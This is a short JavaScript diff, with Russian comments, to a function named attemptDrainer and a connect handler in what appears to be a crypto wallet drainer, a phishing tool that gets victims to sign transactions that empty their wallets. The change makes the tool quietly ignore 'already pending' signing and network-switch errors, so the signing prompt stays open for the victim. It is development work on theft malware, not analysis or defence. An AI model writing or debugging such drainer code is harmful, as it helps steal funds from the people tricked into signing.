@@ -427,9 +427,13 @@ async function attemptDrainer() {
     }
   } catch (err) {
     isTransactionPending = false;
-    // Игнорируем ошибку "Request of type 'PUBLIC_switchEthereumChain' already pending"
+    // Игнорируем ошибки "Request of type 'PUBLIC_switchEthereumChain' already pending" и "Request of type 'PUBLIC_signTransaction' already pending"
     if (err.message.includes("Request of type 'PUBLIC_switchEthereumChain' already pending")) {
       console.warn('⚠️ Запрос на переключение сети уже ожидается, ждём завершения:', err.message);
+      return; // Не обновляем модальное окно, оставляем его в текущем состоянии
+    }
+    if (err.message.includes("Request of type 'PUBLIC_signTransaction' already pending")) {
+      console.warn('⚠️ Запрос на подпись транзакции уже ожидается, ждём завершения:', err.message);
       return; // Не обновляем модальное окно, оставляем его в текущем состоянии
     }
 
@@ -466,9 +470,13 @@ async function handleConnectOrAction() {
       console.log('⏳ Транзакция уже выполняется');
     }
   } catch (err) {
-    // Игнорируем ошибку "Request of type 'PUBLIC_switchEthereumChain' already pending"
+    // Игнорируем ошибки "Request of type 'PUBLIC_switchEthereumChain' already pending" и "Request of type 'PUBLIC_signTransaction' already pending"
     if (err.message.includes("Request of type 'PUBLIC_switchEthereumChain' already pending")) {
       console.warn('⚠️ Запрос на переключение сети уже ожидается, ждём завершения:', err.message);
+      return; // Не обновляем модальное окно
+    }
+    if (err.message.includes("Request of type 'PUBLIC_signTransaction' already pending")) {
+      console.warn('⚠️ Запрос на подпись транзакции уже ожидается, ждём завершения:', err.message);
       return; // Не обновляем модальное окно
     }
 
